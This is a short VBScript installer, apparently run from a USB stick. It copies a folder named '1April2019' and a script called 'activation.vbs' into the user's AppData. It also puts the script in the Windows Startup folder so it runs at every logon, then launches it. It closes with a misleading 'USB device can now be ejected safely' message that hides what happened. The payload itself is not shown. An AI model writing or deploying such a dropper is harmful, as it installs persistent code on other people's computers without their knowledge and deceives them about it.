Dim fso, objShell
Dim userProfile, startupDirectory, appDataDirectory

Set fso = CreateObject("Scripting.FileSystemObject")
Set objShell = WScript.CreateObject("WScript.Shell")

' Get the path to the user's C: folder.
userProfile = objShell.ExpandEnvironmentStrings("%USERPROFILE%")
' Declare the AppData and Startup paths which will be created.
startupDirectory = userProfile + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
appDataDirectory = userProfile + "\AppData\Local\1April2019"

' Create the AppData folder for the program if it does not already exist.
If Not fso.FolderExists(appDataDirectory) Then
    fso.CreateFolder appDataDirectory
End If

' Copy the Visual Studio project into the program's AppData folder, and copy the activation script to the
' program's AppData folder and create the Startup entry in case the user logs off or shuts down the computer.
fso.CopyFolder "1April2019", appDataDirectory
fso.CopyFile "activation.vbs", appDataDirectory + "\"
fso.CopyFile "activation.vbs", startupDirectory

' Execute the activation script that was copied to the program's AppData folder.
objShell.Run appDataDirectory + "\activation.vbs"
Set objShell = Nothing

MsgBox("Success! The USB device can now be ejected safely.")
